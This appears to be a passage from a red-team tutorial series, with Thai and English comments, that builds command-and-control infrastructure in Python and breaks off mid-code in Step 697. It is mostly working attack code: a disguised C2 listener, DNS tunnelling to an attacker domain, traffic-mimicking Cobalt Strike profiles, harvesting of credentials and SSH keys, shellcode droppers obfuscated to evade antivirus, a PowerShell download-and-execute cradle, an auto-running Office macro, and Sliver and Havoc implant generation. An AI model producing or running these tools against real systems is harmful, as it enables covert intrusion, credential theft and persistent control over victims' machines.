# Part 70: Advanced Red Team - C2 Frameworks (Steps 691-700)

## Step 691: C2 Framework Architecture Overview

```python
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Callable
from enum import Enum
import uuid
import time
import json
import base64
import hashlib
import os


class AgentStatus(Enum):
    ACTIVE = 'active'
    DORMANT = 'dormant'
    DEAD = 'dead'
    COMPROMISED = 'compromised'


@dataclass
class Agent:
    """C2 agent/implant representation"""
    agent_id: str
    hostname: str
    username: str
    os: str
    arch: str
    ip: str
    external_ip: str
    checkin_interval: int = 60  # seconds
    last_seen: float = field(default_factory=time.time)
    status: AgentStatus = AgentStatus.ACTIVE
    tags: List[str] = field(default_factory=list)
    tasks: List[Dict] = field(default_factory=list)
    completed_tasks: List[Dict] = field(default_factory=list)
    
    def is_alive(self, timeout: int = 300) -> bool:
        """Check if agent is alive based on last checkin"""
        return (time.time() - self.last_seen) < timeout
    
    def queue_task(self, task_type: str, args: Dict = None) -> str:
        """Queue a task for the agent"""
        task_id = str(uuid.uuid4())[:8]
        self.tasks.append({
            'id': task_id,
            'type': task_type,
            'args': args or {},
            'created_at': time.time(),
            'status': 'pending'
        })
        return task_id
    
    def get_pending_tasks(self) -> List[Dict]:
        """Get pending tasks for agent"""
        return [t for t in self.tasks if t['status'] == 'pending']
    
    def complete_task(self, task_id: str, output: str, success: bool = True):
        """Mark task as completed"""
        for task in self.tasks:
            if task['id'] == task_id:
                task['status'] = 'completed' if success else 'failed'
                task['output'] = output
                task['completed_at'] = time.time()
                self.completed_tasks.append(task)
                self.tasks.remove(task)
                break


class C2Server:
    """หน้าที่ C2 Server สำหรับ red team operations"""
    
    def __init__(self, server_id: str = None):
        self.server_id = server_id or str(uuid.uuid4())[:8]
        self.agents: Dict[str, Agent] = {}
        self.listeners: List[Dict] = []
        self.operations: List[Dict] = []
        
    def register_agent(self, agent_data: Dict) -> Agent:
        """Register new agent checkin"""
        agent = Agent(
            agent_id=agent_data.get('id', str(uuid.uuid4())[:8]),
            hostname=agent_data.get('hostname', 'unknown'),
            username=agent_data.get('username', 'unknown'),
            os=agent_data.get('os', 'unknown'),
            arch=agent_data.get('arch', 'x64'),
            ip=agent_data.get('ip', ''),
            external_ip=agent_data.get('external_ip', ''),
        )
        self.agents[agent.agent_id] = agent
        print(f"[+] New agent: {agent.agent_id} @ {agent.hostname} ({agent.username}@{agent.os})")
        return agent
    
    def get_active_agents(self) -> List[Agent]:
        """Get all active agents"""
        return [
            a for a in self.agents.values()
            if a.is_alive() and a.status == AgentStatus.ACTIVE
        ]
    
    def issue_command(self, agent_id: str, cmd_type: str, 
                       args: Dict = None) -> Optional[str]:
        """Issue command to agent"""
        agent = self.agents.get(agent_id)
        if not agent:
            print(f"[-] Agent {agent_id} not found")
            return None
        
        task_id = agent.queue_task(cmd_type, args)
        print(f"[*] Queued {cmd_type} task {task_id} for {agent_id}")
        return task_id
    
    def bulk_command(self, cmd_type: str, args: Dict = None,
                      filter_tags: List[str] = None) -> List[str]:
        """Send command to multiple agents"""
        task_ids = []
        agents = self.get_active_agents()
        
        if filter_tags:
            agents = [
                a for a in agents
                if any(tag in a.tags for tag in filter_tags)
            ]
        
        for agent in agents:
            task_id = self.issue_command(agent.agent_id, cmd_type, args)
            if task_id:
                task_ids.append(task_id)
        
        return task_ids
    
    def generate_agent_config(self, listener_url: str, 
                               sleep: int = 60, 
                               jitter: int = 10) -> Dict:
        """Generate agent configuration"""
        return {
            'server_id': self.server_id,
            'c2_url': listener_url,
            'sleep': sleep,
            'jitter': jitter,
            'kill_date': None,
            'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
            'proxy': None,
            'encryption_key': base64.b64encode(os.urandom(32)).decode()
        }
    
    def dashboard(self) -> str:
        """Display C2 dashboard"""
        active = self.get_active_agents()
        lines = [
            "=" * 60,
            f"C2 Server Dashboard [ID: {self.server_id}]",
            "=" * 60,
            f"Active Agents: {len(active)}",
            f"Total Agents: {len(self.agents)}",
            "",
            "Agents:"
        ]
        
        for agent in active:
            last_seen = int(time.time() - agent.last_seen)
            lines.append(
                f"  [{agent.agent_id}] {agent.hostname} | "
                f"{agent.username}@{agent.os} | "
                f"Last: {last_seen}s ago | "
                f"Tasks: {len(agent.tasks)} pending"
            )
        
        return '\n'.join(lines)
```

## Step 692: HTTP/S C2 Communication Protocol

```python
from flask import Flask, request, jsonify, Response
import base64
import json
import os
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import hmac
import hashlib
import time
from typing import Dict, Optional


class C2CommunicationProtocol:
    """Encrypted C2 communication protocol"""
    
    def __init__(self, psk: str):
        """Pre-shared key สำหรับเข้ารหัส"""
        self.psk = psk.encode()
        self._key = self._derive_key(psk)
        self.fernet = Fernet(self._key)
    
    def _derive_key(self, psk: str) -> bytes:
        """Derive encryption key from PSK"""
        salt = b'c2_salt_value_2024'  # Should be random and stored
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
        )
        key = base64.urlsafe_b64encode(kdf.derive(psk.encode()))
        return key
    
    def encrypt_payload(self, data: Dict) -> str:
        """Encrypt outgoing payload"""
        plaintext = json.dumps(data).encode()
        encrypted = self.fernet.encrypt(plaintext)
        return base64.b64encode(encrypted).decode()
    
    def decrypt_payload(self, encrypted_b64: str) -> Dict:
        """Decrypt incoming payload"""
        encrypted = base64.b64decode(encrypted_b64)
        plaintext = self.fernet.decrypt(encrypted)
        return json.loads(plaintext)
    
    def sign_request(self, data: str, timestamp: int) -> str:
        """HMAC sign request"""
        message = f"{data}:{timestamp}".encode()
        sig = hmac.new(self.psk, message, hashlib.sha256).hexdigest()
        return sig
    
    def verify_request(self, data: str, timestamp: int, 
                        signature: str, max_age: int = 300) -> bool:
        """Verify HMAC signature and timestamp"""
        # Check timestamp freshness
        if abs(time.time() - timestamp) > max_age:
            return False
        
        expected = self.sign_request(data, timestamp)
        return hmac.compare_digest(expected, signature)


class C2HTTPListener:
    """HTTP C2 listener using Flask"""
    
    def __init__(self, c2_server: C2Server, psk: str, 
                  host: str = '0.0.0.0', port: int = 8443):
        self.c2 = c2_server
        self.protocol = C2CommunicationProtocol(psk)
        self.app = Flask(__name__)
        self.host = host
        self.port = port
        self._setup_routes()
    
    def _setup_routes(self):
        """Setup C2 HTTP routes"""
        
        @self.app.route('/api/v1/update', methods=['POST'])
        def agent_checkin():
            """Agent check-in endpoint - looks like normal API call"""
            try:
                data = request.get_json()
                if not data:
                    return jsonify({'status': 'ok'}), 200
                
                # Verify signature
                timestamp = data.get('ts', 0)
                signature = data.get('sig', '')
                payload_enc = data.get('d', '')
                
                if not self.protocol.verify_request(payload_enc, timestamp, signature):
                    return jsonify({'error': 'unauthorized'}), 403
                
                # Decrypt agent data
                agent_data = self.protocol.decrypt_payload(payload_enc)
                
                # Register/update agent
                agent_id = agent_data.get('id')
                if agent_id in self.c2.agents:
                    agent = self.c2.agents[agent_id]
                    agent.last_seen = time.time()
                    
                    # Check for task results
                    if 'result' in agent_data:
                        agent.complete_task(
                            agent_data['result']['task_id'],
                            agent_data['result']['output']
                        )
                else:
                    agent = self.c2.register_agent(agent_data)
                
                # Return pending tasks
                pending = agent.get_pending_tasks()
                
                if pending:
                    response_data = {
                        'tasks': pending[:1]  # Send one task at a time
                    }
                    encrypted_response = self.protocol.encrypt_payload(response_data)
                    ts = int(time.time())
                    sig = self.protocol.sign_request(encrypted_response, ts)
                    return jsonify({'d': encrypted_response, 'ts': ts, 'sig': sig})
                
                return jsonify({'status': 'ok'}), 200
                
            except Exception as e:
                return jsonify({'status': 'ok'}), 200  # Never reveal errors
        
        @self.app.route('/static/<path:filename>')
        def serve_static(filename):
            """Fake static file endpoint for cover"""
            return Response('', mimetype='text/plain')
        
        @self.app.route('/')
        def index():
            """Legitimate-looking front page"""
            return '<html><body><h1>Welcome</h1></body></html>'
    
    def start(self, debug: bool = False):
        """Start C2 listener"""
        print(f"[*] Starting C2 listener on {self.host}:{self.port}")
        self.app.run(
            host=self.host,
            port=self.port,
            ssl_context='adhoc',
            debug=debug
        )


class DNS_C2Protocol:
    """โปรโตคอล DNS tunneling สำหรับ C2"""
    
    def __init__(self, domain: str, dns_server: str):
        self.domain = domain  # c2.attacker.com
        self.dns_server = dns_server
        
    def encode_data_for_dns(self, data: str) -> List[str]:
        """เข้ารหัสและแบ่ข้อมูลเป็น DNS labels"""
        encoded = base64.b32encode(data.encode()).decode().lower()
        encoded = encoded.replace('=', '')  # Remove padding
        
        # แบ่เป็น chunks 63 chars (ขีดจำกัด DNS label)
        chunks = [encoded[i:i+63] for i in range(0, len(encoded), 63)]
        
        # สร้าง DNS queries
        queries = []
        for i, chunk in enumerate(chunks):
            seq = str(i).zfill(3)
            query = f"{chunk}.{seq}.{self.domain}"
            queries.append(query)
        
        return queries
    
    def decode_dns_response(self, txt_record: str) -> Optional[str]:
        """ถอดรหัสข้อมูลจาก TXT record"""
        try:
            # Add padding back
            padded = txt_record + '=' * (8 - len(txt_record) % 8)
            decoded = base64.b32decode(padded.upper()).decode()
            return decoded
        except Exception:
            return None
    
    def generate_beaconing_config(self, c2_domain: str, interval: int = 300) -> str:
        """สร้าง DNS beaconing configuration"""
        return f"""
# DNS C2 Beaconing Configuration
# Domain: {c2_domain}
# Interval: {interval}s

# Agent จะใช้ DNS queries เพื่อ communication:
# 1. Check-in: <agent_id>.ping.{c2_domain}
# 2. Send data: <b32_data>.<seq>.data.{c2_domain}
# 3. Get commands: <agent_id>.cmd.{c2_domain} -> TXT record

# DNS server จะ respond:
# - TXT records สำหรับ commands
# - CNAME records สำหรับ data
"""
```

## Step 693: Cobalt Strike Profile Emulation

```python
import random
import string
from dataclasses import dataclass
from typing import List, Dict, Optional
import json


@dataclass
class C2Profile:
    """Malleable C2 profile configuration"""
    name: str
    user_agent: str
    uri_paths: List[str]
    headers: Dict[str, str]
    sleep_time: int
    jitter: int
    prepend_data: str = ''
    append_data: str = ''
    transform: str = 'base64'
    

class MalleableC2ProfileGenerator:
    """Generate Cobalt Strike-style malleable C2 profiles"""
    
    # เลียนแบบ legitimate traffic profiles
    PROFILES = {
        'amazon': C2Profile(
            name='amazon',
            user_agent='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
            uri_paths=['/s/ref=nb_sb_noss_1/167-3294888-0262949/field-keywords=books'],
            headers={
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'Referer': 'http://www.amazon.com/'
            },
            sleep_time=5000,
            jitter=10,
            prepend_data='',
            append_data=''
        ),
        'office365': C2Profile(
            name='office365',
            user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            uri_paths=['/teams/livechat/m/messages', '/api/v2/signals/handler'],
            headers={
                'Accept': 'application/json, text/plain, */*',
                'Accept-Language': 'en-US,en;q=0.9',
                'Content-Type': 'application/json',
                'X-Client-SKU': 'SkypeTeams',
                'Origin': 'https://teams.microsoft.com'
            },
            sleep_time=3000,
            jitter=15
        ),
        'googledocs': C2Profile(
            name='googledocs',
            user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            uri_paths=['/document/d/1BxiMVs0XRA5nFMdKvBdBZjgmUUqptlbs74OgVE2upms/edit'],
            headers={
                'Accept': 'text/html,application/xhtml+xml',
                'Accept-Language': 'en-US,en;q=0.9',
                'Referer': 'https://docs.google.com/'
            },
            sleep_time=4000,
            jitter=20
        )
    }
    
    def generate_aggressor_profile(self, profile: C2Profile) -> str:
        """สร้าง Cobalt Strike .profile file"""
        uri_list = ' '.join(f'"/{uri.lstrip("/")}"' 
                           for uri in profile.uri_paths)
        
        headers_block = '\n'.join(
            f'    header "{k}" "{v}";'
            for k, v in profile.headers.items()
        )
        
        profile_content = f"""
# Malleable C2 Profile: {profile.name}
# Generated for authorized Red Team operations

set sleeptime "{profile.sleep_time}";
set jitter    "{profile.jitter}";
set maxdns    "255";
set useragent "{profile.user_agent}";

http-get {{
    set uri "{' '.join(profile.uri_paths)}";
    
    client {{
        header "Accept" "{profile.headers.get('Accept', '*/*')}";
        header "Host" "target-domain.com";
        
        metadata {{
            base64url;
            prepend "session=";
            header "Cookie";
        }}
    }}
    
    server {{
        header "Content-Type" "text/html";
        header "Server" "Apache";
        
        output {{
            netbios;
            prepend "{profile.prepend_data}";
            append "{profile.append_data}";
            print;
        }}
    }}
}}

http-post {{
    set uri "{' '.join(profile.uri_paths)}";
    
    client {{
{headers_block}
        
        id {{
            uri-append;
        }}
        
        output {{
            base64;
            print;
        }}
    }}
    
    server {{
        header "Content-Type" "text/html";
        
        output {{
            print;
        }}
    }}
}}

http-stager {{
    set uri_x86 "/jquery-3.3.1.slim.min.js";
    set uri_x64 "/jquery-3.3.2.slim.min.js";
    
    server {{
        header "Content-Type" "application/javascript";
    }}
}}
"""
        return profile_content
    
    def validate_profile(self, profile_path: str) -> bool:
        """ตรวจสอบ profile ด้วย c2lint"""
        import subprocess
        result = subprocess.run(
            ['./c2lint', profile_path],
            capture_output=True, text=True
        )
        return result.returncode == 0
    
    def generate_redirect_rules(self, c2_ip: str, 
                                  profile: C2Profile,
                                  decoy_site: str = 'example.com') -> str:
        """สร้าง Apache/Nginx redirect rules สำหรับ C2 redirector"""
        # Apache .htaccess
        htaccess = f"""
# C2 Redirector Rules - Apache
# ส่ง C2 traffic ไป {c2_ip}, ส่ง other traffic ไป decoy site

RewriteEngine On
RewriteCond %{{REQUEST_METHOD}} POST [NC,OR]
RewriteCond %{{REQUEST_URI}} ({" ".join(p.replace("/", "\\\/") for p in profile.uri_paths)}) [NC]
RewriteRule ^.*$ https://{c2_ip}%{{REQUEST_URI}} [P,L]

# ผู้ที่ใช้ User-Agent ถูกต้องจะถูก redirect ไป C2
RewriteCond %{{HTTP_USER_AGENT}} ({profile.user_agent.replace('(', '\\(').replace(')', '\\)')}) [NC]
RewriteRule ^.*$ https://{c2_ip}%{{REQUEST_URI}} [P,L]

# Others go to decoy
RewriteRule ^.*$ https://{decoy_site}/ [R=302,L]
"""
        return htaccess
```

## Step 694: Post-Exploitation Framework

```python
import subprocess
import platform
import os
import socket
import struct
from dataclasses import dataclass, field
from typing import List, Dict, Optional
import base64
import json


class PostExploitationFramework:
    """เครื่องมือ post-exploitation สำหรับ red team"""
    
    def system_enumeration(self) -> Dict:
        """เก็บข้อมูล system"""
        info = {
            'hostname': socket.gethostname(),
            'fqdn': socket.getfqdn(),
            'os': platform.system(),
            'os_version': platform.version(),
            'arch': platform.machine(),
            'cpu_count': os.cpu_count(),
            'username': os.environ.get('USER') or os.environ.get('USERNAME', 'unknown'),
            'home': os.path.expanduser('~'),
            'cwd': os.getcwd(),
            'pid': os.getpid(),
            'ppid': os.getppid() if hasattr(os, 'getppid') else None,
        }
        
        # ตรวจสอบ privileges
        try:
            info['is_admin'] = os.getuid() == 0  # Linux
        except AttributeError:
            import ctypes
            try:
                info['is_admin'] = ctypes.windll.shell32.IsUserAnAdmin()
            except Exception:
                info['is_admin'] = False
        
        # Network interfaces
        try:
            import netifaces
            interfaces = {}
            for iface in netifaces.interfaces():
                addrs = netifaces.ifaddresses(iface)
                if netifaces.AF_INET in addrs:
                    interfaces[iface] = addrs[netifaces.AF_INET][0]['addr']
            info['interfaces'] = interfaces
        except ImportError:
            info['interfaces'] = {}
        
        return info
    
    def enumerate_network(self) -> Dict:
        """เก็บข้อมูลเครือข่าย"""
        network_info = {
            'local_ip': '',
            'gateway': '',
            'dns_servers': [],
            'arp_table': [],
            'open_ports': [],
            'listening_services': []
        }
        
        try:
            # Get local IP
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(('8.8.8.8', 80))
            network_info['local_ip'] = s.getsockname()[0]
            s.close()
        except Exception:
            pass
        
        # ARP table
        result = subprocess.run(
            ['arp', '-n'] if platform.system() != 'Windows' else ['arp', '-a'],
            capture_output=True, text=True
        )
        network_info['arp_table'] = result.stdout.strip().split('\n')
        
        # DNS servers
        if platform.system() == 'Linux':
            try:
                with open('/etc/resolv.conf') as f:
                    for line in f:
                        if line.startswith('nameserver'):
                            network_info['dns_servers'].append(line.split()[1])
            except Exception:
                pass
        
        # Listening services
        result = subprocess.run(
            ['ss', '-tlnp'] if platform.system() == 'Linux' else ['netstat', '-ano'],
            capture_output=True, text=True
        )
        network_info['listening_services'] = result.stdout.strip().split('\n')
        
        return network_info
    
    def enumerate_credentials(self) -> List[Dict]:
        """หา credentials ที่อาจเอาไปใช้ได้"""
        credentials = []
        
        # SSH keys
        ssh_dir = os.path.expanduser('~/.ssh')
        if os.path.isdir(ssh_dir):
            for f in os.listdir(ssh_dir):
                key_path = os.path.join(ssh_dir, f)
                if os.path.isfile(key_path):
                    try:
                        content = open(key_path).read(100)
                        if 'PRIVATE KEY' in content:
                            credentials.append({
                                'type': 'SSH Private Key',
                                'path': key_path,
                                'key_type': content.split('\n')[0].replace('-----BEGIN ', '').replace('-----', '')
                            })
                    except Exception:
                        pass
        
        # Browser credentials (Chrome)
        chrome_login_db = os.path.expanduser(
            '~/.config/google-chrome/Default/Login Data'
        )
        if os.path.exists(chrome_login_db):
            credentials.append({
                'type': 'Chrome Saved Passwords',
                'path': chrome_login_db,
                'note': 'Use python-chrome-passwords to extract'
            })
        
        # Bash history
        bash_history = os.path.expanduser('~/.bash_history')
        if os.path.exists(bash_history):
            try:
                history = open(bash_history).read()
                # หา commands ที่มี credentials
                cred_patterns = [
                    ('MySQL', r'mysql\s+-u\w+\s+-p\w+'),
                    ('SSH', r'ssh\s+\w+@'),
                    ('curl with auth', r'curl.*-u\s+\S+:\S+'),
                ]
                import re
                for cred_type, pattern in cred_patterns:
                    matches = re.findall(pattern, history)
                    if matches:
                        credentials.append({
                            'type': f'bash_history: {cred_type}',
                            'matches': matches[:5]
                        })
            except Exception:
                pass
        
        # Environment variables with credentials
        cred_env_vars = [
            'AWS_ACCESS_KEY_ID', 'AWS_SECRET_ACCESS_KEY',
            'DATABASE_URL', 'DB_PASSWORD', 'API_KEY',
            'GITHUB_TOKEN', 'SLACK_TOKEN', 'PASSWORD'
        ]
        for var in cred_env_vars:
            value = os.environ.get(var)
            if value:
                credentials.append({
                    'type': 'Environment Variable',
                    'name': var,
                    'value': value[:20] + '...' if len(value) > 20 else value
                })
        
        return credentials
    
    def list_interesting_files(self) -> List[Dict]:
        """หาไฟล์ที่น่าสนใจ"""
        interesting_files = []
        
        paths_to_check = [
            '/etc/passwd',
            '/etc/shadow',
            '/etc/sudoers',
            '/root/.ssh/id_rsa',
            '/root/.ssh/authorized_keys',
            '/home/*/.ssh/id_rsa',
            '/var/www/html/wp-config.php',
            '/var/www/html/.env',
            '/opt/*/config',
            '/etc/nginx/nginx.conf',
            '/etc/apache2/apache2.conf',
        ]
        
        for path_pattern in paths_to_check:
            import glob
            paths = glob.glob(path_pattern)
            for path in paths:
                if os.path.isfile(path):
                    stat = os.stat(path)
                    interesting_files.append({
                        'path': path,
                        'size': stat.st_size,
                        'readable': os.access(path, os.R_OK),
                        'writable': os.access(path, os.W_OK)
                    })
        
        return interesting_files
    
    def generate_report(self) -> str:
        """สร้าง post-exploitation report"""
        sys_info = self.system_enumeration()
        net_info = self.enumerate_network()
        creds = self.enumerate_credentials()
        files = self.list_interesting_files()
        
        report = [
            "=" * 60,
            "Post-Exploitation Report",
            "=" * 60,
            f"\n[System Info]",
            f"  Hostname: {sys_info['hostname']}",
            f"  OS: {sys_info['os']} {sys_info['os_version']}",
            f"  User: {sys_info['username']}",
            f"  Admin: {sys_info.get('is_admin', False)}",
            f"  Local IP: {net_info.get('local_ip', 'unknown')}",
            f"\n[Credentials Found]",
            f"  Total: {len(creds)}",
        ]
        
        for cred in creds:
            report.append(f"  - {cred['type']}: {cred.get('path', cred.get('name', 'N/A'))}")
        
        report.append(f"\n[Interesting Files]")
        readable = [f for f in files if f['readable']]
        report.append(f"  Readable: {len(readable)}")
        
        for f in readable[:10]:
            report.append(f"  - {f['path']} ({'writable' if f['writable'] else 'read-only'})")
        
        return '\n'.join(report)
```

## Step 695: Payload Generation and Obfuscation

```python
import base64
import os
import struct
import random
from typing import List, Optional, Tuple
from dataclasses import dataclass


@dataclass
class Payload:
    """Shellcode/payload container"""
    raw_bytes: bytes
    architecture: str  # x86, x64
    os_target: str  # windows, linux, macos
    format: str  # raw, exe, dll, elf, py, ps1
    description: str = ''


class PayloadObfuscator:
    """เครื่องมือ obfuscate payloads สำหรับ bypass AV"""
    
    def xor_encode(self, shellcode: bytes, key: bytes = None) -> Tuple[bytes, bytes]:
        """เข้ารหัสด้วย XOR"""
        if key is None:
            key = os.urandom(4)
        
        encoded = bytearray()
        for i, byte in enumerate(shellcode):
            encoded.append(byte ^ key[i % len(key)])
        
        return bytes(encoded), key
    
    def aes_encrypt_shellcode(self, shellcode: bytes) -> Tuple[bytes, bytes, bytes]:
        """เข้ารหัสด้วย AES-256"""
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        from cryptography.hazmat.backends import default_backend
        
        key = os.urandom(32)  # AES-256
        iv = os.urandom(16)   # AES block size
        
        # Pad to block size
        pad_len = 16 - (len(shellcode) % 16)
        shellcode_padded = shellcode + bytes([pad_len] * pad_len)
        
        cipher = Cipher(
            algorithms.AES(key),
            modes.CBC(iv),
            backend=default_backend()
        )
        encryptor = cipher.encryptor()
        ciphertext = encryptor.update(shellcode_padded) + encryptor.finalize()
        
        return ciphertext, key, iv
    
    def generate_python_dropper(self, shellcode: bytes, 
                                  technique: str = 'xor') -> str:
        """สร้าง Python dropper สำหรับ Linux"""
        if technique == 'xor':
            encoded, key = self.xor_encode(shellcode)
            encoded_b64 = base64.b64encode(encoded).decode()
            key_b64 = base64.b64encode(key).decode()
            
            dropper = f"""
import ctypes
import base64
import mmap

def decode_payload(encoded_b64, key_b64):
    encoded = base64.b64decode(encoded_b64)
    key = base64.b64decode(key_b64)
    decoded = bytearray()
    for i, b in enumerate(encoded):
        decoded.append(b ^ key[i % len(key)])
    return bytes(decoded)

def execute_shellcode(shellcode):
    # Allocate executable memory
    buf = mmap.mmap(-1, len(shellcode),
                    prot=mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC)
    buf.write(shellcode)
    buf.seek(0)
    
    func = ctypes.cast(ctypes.c_char_p(buf.read()), ctypes.CFUNCTYPE(None))
    func()

sc = decode_payload('{encoded_b64}', '{key_b64}')
execute_shellcode(sc)
"""
        elif technique == 'aes':
            ciphertext, key, iv = self.aes_encrypt_shellcode(shellcode)
            
            dropper = f"""
import ctypes
import base64
import mmap
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

def decrypt_payload(ct_b64, key_b64, iv_b64):
    ct = base64.b64decode(ct_b64)
    key = base64.b64decode(key_b64)
    iv = base64.b64decode(iv_b64)
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    dec = cipher.decryptor()
    pt = dec.update(ct) + dec.finalize()
    pad = pt[-1]
    return pt[:-pad]

def execute_shellcode(sc):
    buf = mmap.mmap(-1, len(sc), prot=mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC)
    buf.write(sc)
    buf.seek(0)
    func = ctypes.cast(ctypes.c_char_p(buf.read()), ctypes.CFUNCTYPE(None))
    func()

sc = decrypt_payload(
    '{base64.b64encode(ciphertext).decode()}',
    '{base64.b64encode(key).decode()}',
    '{base64.b64encode(iv).decode()}'
)
execute_shellcode(sc)
"""
        return dropper
    
    def generate_powershell_cradle(self, url: str, 
                                    execution_policy_bypass: bool = True) -> str:
        """สร้าง PowerShell download cradle"""
        if execution_policy_bypass:
            return f"""
# Encoded execution (bypass AMSI/Script Block Logging)
$epc = [System.Text.Encoding]::Unicode.GetBytes(
    "IEX (New-Object Net.WebClient).DownloadString('{url}')"
)
$b64 = [Convert]::ToBase64String($epc)
powershell -EncodedCommand $b64
"""
        else:
            return f"IEX (New-Object Net.WebClient).DownloadString('{url}')"
    
    def generate_vba_macro(self, powershell_cmd: str) -> str:
        """สร้าง VBA macro สำหรับ Office"""
        # Obfuscate by splitting string
        cmd_parts = [powershell_cmd[i:i+10] 
                    for i in range(0, len(powershell_cmd), 10)]
        
        vba = """
Sub AutoOpen()
    AutoExec
End Sub

Sub Document_Open()
    AutoExec
End Sub

Sub AutoExec()
    Dim s As String
"""
        # Build command by concatenation (bypass simple string detection)
        for i, part in enumerate(cmd_parts):
            escaped = part.replace('"', '""')
            vba += f'    s = s & "{escaped}"\n'
        
        vba += """
    Dim wsh As Object
    Set wsh = CreateObject("WScript.Shell")
    wsh.Run "powershell -w hidden -ep bypass -c " & s, 0, False
    Set wsh = Nothing
End Sub
"""
        return vba
```

## Step 696: Sliver C2 Framework Integration

```python
import subprocess
import json
from dataclasses import dataclass, field
from typing import List, Dict, Optional


class SliverC2:
    """การใช้งาน Sliver C2 Framework"""
    
    def __init__(self, sliver_path: str = '/usr/local/bin/sliver-server'):
        self.sliver_path = sliver_path
        
    def generate_implant(self, c2_url: str, 
                           os_target: str = 'linux',
                           arch: str = 'amd64',
                           format: str = 'shellcode',
                           sleep: int = 60,
                           jitter: int = 30) -> Dict:
        """สร้าง Sliver implant"""
        cmd = [
            'sliver-client',
            'generate',
            '--http', c2_url,
            '--os', os_target,
            '--arch', arch,
            '--format', format,
            '--sleep', str(sleep),
            '--jitter', str(jitter),
            '--save', '/tmp/implant',
            '--json'
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        try:
            return json.loads(result.stdout)
        except json.JSONDecodeError:
            return {'status': 'error', 'output': result.stdout}
    
    def generate_beacon(self, c2_url: str, 
                         beacon_interval: int = 60,
                         beacon_jitter: int = 30) -> Dict:
        """Generate Sliver beacon (async)"""
        cmd = [
            'sliver-client',
            'generate', 'beacon',
            '--http', c2_url,
            '--beacon-interval', str(beacon_interval),
            '--beacon-jitter', str(beacon_jitter),
            '--save', '/tmp/beacon',
            '--json'
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        try:
            return json.loads(result.stdout)
        except json.JSONDecodeError:
            return {'error': result.stderr}
    
    def generate_mtls_implant(self, c2_host: str, port: int = 4444) -> str:
        """Generate mTLS implant config"""
        config = {
            'c2': [{'url': f'mtls://{c2_host}:{port}'}],
            'sleep': 60,
            'jitter': 0.3,
            'reconnect': 60,
            'max_errors': 1000,
        }
        return json.dumps(config, indent=2)
    
    def list_sessions(self) -> List[Dict]:
        """List active sessions"""
        result = subprocess.run(
            ['sliver-client', 'sessions', '--json'],
            capture_output=True, text=True
        )
        try:
            return json.loads(result.stdout)
        except json.JSONDecodeError:
            return []
    
    def execute_command(self, session_id: str, command: str) -> str:
        """Execute command in session"""
        result = subprocess.run(
            ['sliver-client', 'execute', '-s', session_id, command],
            capture_output=True, text=True
        )
        return result.stdout
    
    def setup_https_listener(self, domain: str, 
                               letsencrypt: bool = True,
                               port: int = 443) -> Dict:
        """Setup HTTPS listener with Let's Encrypt"""
        cmd = [
            'sliver-client', 'https',
            '--domain', domain,
            '--port', str(port),
        ]
        
        if letsencrypt:
            cmd.append('--lets-encrypt')
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        return {'output': result.stdout, 'success': result.returncode == 0}
    
    def setup_dns_listener(self, domain: str) -> Dict:
        """Setup DNS C2 listener"""
        result = subprocess.run(
            ['sliver-client', 'dns', '--domain', domain],
            capture_output=True, text=True
        )
        return {'output': result.stdout, 'success': result.returncode == 0}
    
    def armory_install(self, package: str) -> bool:
        """Install Sliver armory package"""
        result = subprocess.run(
            ['sliver-client', 'armory', 'install', package],
            capture_output=True, text=True
        )
        return result.returncode == 0
```

## Step 697: Havoc C2 Framework Usage

```python
from dataclasses import dataclass
from typing import List, Dict, Optional
import json
import requests


@dataclass
class HavocTeamserver:
    """Havoc C2 Teamserver configuration"""
    host: str
    port: int = 40056
    username: str = 'operator'
    password: str = ''
    api_token: str = ''


class HavocC2Client:
    """เชื่อมต่อ Havoc C2 REST API"""
    
    def __init__(self, teamserver: HavocTeamserver):
        self.server = teamserver
        self.base_url = f"https://{teamserver.host}:{teamserver.port}/api/v1"
        self.session = requests.Session()
        self.session.verify = False
        
    def authenticate(self) -> bool:
        """Authenticate to teamserver"""
        response = self.session.post(
            f"{self.base_url}/auth/login",
            json={
                'username': self.server.username,
                'password': self.server.password
            }
        )
        
        if response.status_code == 200:
            data = response.json()
            self.server.api_token = data.get('token', '')
            self.session.headers['Authorization'] = f'Bearer {self.server.api_token}'
            return True
        return False
    
    def get_agents(self) -> List[Dict]:
        """List all agents"""
        response = self.session.get(f"{self.base_url}/agents")
        if response.status_code == 200:
            return response.json().get('agents', [])
        return []
    
    def create_listener(self, listener_config: Dict) -> Dict:
        """Create new listener"""
        response = self.session.post(
            f"{self.base_url}/listeners",
            json=listener_config
        )
        return response.json()
    
    def generate_payload(self, config: Dict) -> bytes:
        """Generate agent payload"""
        response = self.session.post(
            f"{self.base_url}/payloads/generate",
            json=config,
            stream=True
        )
        if response.status_code == 200:
            return response.content
        return b''
    
    def execute_task(self, agent_id: str, task: Dict) -> Dict:
        """Execute task on agent"""
        response = self.session.post(
            f"{self.base_url}/agents/{agent_id}/tasks",
            json=task
        )
        return response.json() if response.status_code == 200 else {}
    
    def generate_havoc_profile(self, c2_config: Dict) -> str:
        """Generate Havoc teamserver profile"""
        profile = f"""
Teamserver {{
    Host = "{c2_config.get('host', '0.0.0.0')}"
